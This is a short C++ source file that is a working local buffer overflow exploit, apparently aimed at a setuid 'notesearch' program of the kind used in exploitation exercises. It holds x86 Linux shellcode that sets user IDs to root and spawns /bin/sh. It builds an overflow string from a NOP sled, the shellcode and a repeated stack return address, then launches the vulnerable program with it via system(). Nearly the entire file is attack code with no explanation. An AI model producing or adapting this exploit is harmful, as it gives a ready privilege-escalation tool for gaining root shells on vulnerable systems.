#include<bits/stdc++.h>

using namespace std;

char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
                 "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
                 "\xe1\xcd\x80";


int main()
{
    unsigned int i, ret, offset=270;

    char *buffer, *command;

    command = (char*) malloc(200);
    memset(command,0,200);

    strcpy(command, "./notesearch\'");
    buffer = command+strlen(command);

        //buffer = command+strlen(command)-1;
        ret = (unsigned int) &i - offset;

        for(int i=0; i<160; i++)
        {
            *((unsigned int*) (buffer+i))=ret;
            //printf("%x ", *(buffer+i));
        }

        memset(buffer, 0x90, 60);
        memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

        strcat(command, "\'");
        cout<<buffer<<endl;
        cout<<endl<<command<<endl;

        system(command);
    return 0;
}
